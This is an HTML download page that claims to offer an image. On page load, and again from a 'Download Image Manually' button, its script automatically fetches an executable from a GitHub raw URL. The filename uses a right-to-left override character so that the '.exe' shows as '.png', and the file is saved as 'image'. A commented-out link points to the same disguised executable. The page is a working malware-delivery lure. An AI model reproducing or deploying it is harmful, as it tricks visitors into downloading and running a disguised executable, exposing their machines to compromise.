<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>File Download</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      text-align: center;
      padding: 50px;
      background-color: #f9f9f9;
    }
    .container {
      background: white;
      padding: 40px;
      border-radius: 8px;
      display: inline-block;
      box-shadow: 0 4px 6px rgba(0,0,0,0.1);
    }
    h1 {
      color: #333;
    }
    p {
      color: #666;
    }
    .btn {
      display: inline-block;
      margin-top: 20px;
      padding: 12px 24px;
      background-color: #007bff;
      color: white;
      text-decoration: none;
      border-radius: 5px;
      font-weight: bold;
      border: none;
      cursor: pointer;
    }
    .btn:hover {
      background-color: #0056b3;
    }
  </style>
</head>
<body>

  <div class="container">
    <h1>Your download should start automatically...</h1>
    <p>If your browser blocks the popup or it doesn't start in a few seconds, use the button below.</p>
    
    <!-- Backup button for user interaction -->
    <button class="btn" onclick="startAutomaticDownload()">Download Image Manually</button>
  </div>
  <!-- <a href="https://raw.githubusercontent.com/iismayilov18008/salam123/blob/1b07cf9689855446028182ac7a76adb2d2ab8eeb/imag%E2%80%AEgnp.exe" download>Download Report</a> -->
  <script>
    async function startAutomaticDownload() {
      // The exact, complete path to your GitHub file
      const url = "https://raw.githubusercontent.com/iismayilov18008/salam123/blob/efb619242e298da9051ffa6ab8cae05a5f6df5bf/picture/imag%E2%80%AEgnp.exe";
    //   https://raw.githubusercontent.com/<user>/<repo>/<branch>/<path>
      
      try {
        const response = await fetch(url);
        if (!response.ok) throw new Error(`HTTP Error: ${response.status}`);
        
        const blob = await response.blob();
        const blobUrl = window.URL.createObjectURL(blob);
        
        const a = document.createElement("a");
        a.href = blobUrl;
        a.download = "image"; 
        
        document.body.appendChild(a);
        a.click();
        
        document.body.removeChild(a);
        window.URL.revokeObjectURL(blobUrl);
        
        console.log("Download triggered successfully.");
      } catch (error) {
        console.error("Download failed:", error);
        alert("Could not retrieve the file. Please ensure the repository is public and the file exists.");
      }
    }

    // Trigger the download automatically as soon as the HTML content is ready
    window.addEventListener("DOMContentLoaded", startAutomaticDownload);
  </script>

<!-- Code injected by live-server -->

</script>
</body>
</html>
